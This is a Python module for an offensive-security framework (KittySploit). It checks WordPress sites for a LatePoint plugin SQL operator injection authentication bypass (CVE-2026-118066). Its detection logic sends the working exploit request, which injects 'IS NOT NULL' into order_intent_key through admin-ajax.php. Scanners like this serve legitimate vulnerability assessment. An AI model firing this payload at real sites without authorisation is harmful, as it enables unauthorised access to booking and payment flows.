#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LatePoint < 5.7.7 SQL operator injection auth bypass (CVE-2026-118066)."""

from __future__ import annotations

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "latepoint"
_VULN_HIGH = (5, 7, 6)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "LatePoint CVE-2026-118066 auth bypass detect",
        "description": (
            "CVE-2026-118066: latepoint_route_call accepts IS NOT NULL operator "
            "injection in order_intent_key (Nuclei oracle)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-118066",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-118066",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-118066.yaml",
        ],
        "tags": ["web", "scanner", "wordpress", "latepoint", "sqli", "cve-2026-118066"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["risk_signals", "exploit_paths"],
        },
    }

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, "/") or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        data = (
            "action=latepoint_route_call&route_name=steps__start_from_order_intent"
            "&params[order_intent_key]=IS+NOT+NULL"
        )
        resp = self.http_request(
            method="POST",
            path="/wp-admin/admin-ajax.php",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
            },
            data=data,
            allow_redirects=True,
        )
        if not resp or int(resp.status_code) != 200:
            return False
        body = (resp.text or "").lower()
        if "latepoint" not in body:
            return False
        if '"status":"error"' in body or "you are not authorized" in body:
            return False
        if "payment method" not in body and "payment" not in body:
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-118066",
            reason="latepoint_route_call SQL operator injection surface confirmed",
            version=version or "unknown",
        )
        return True
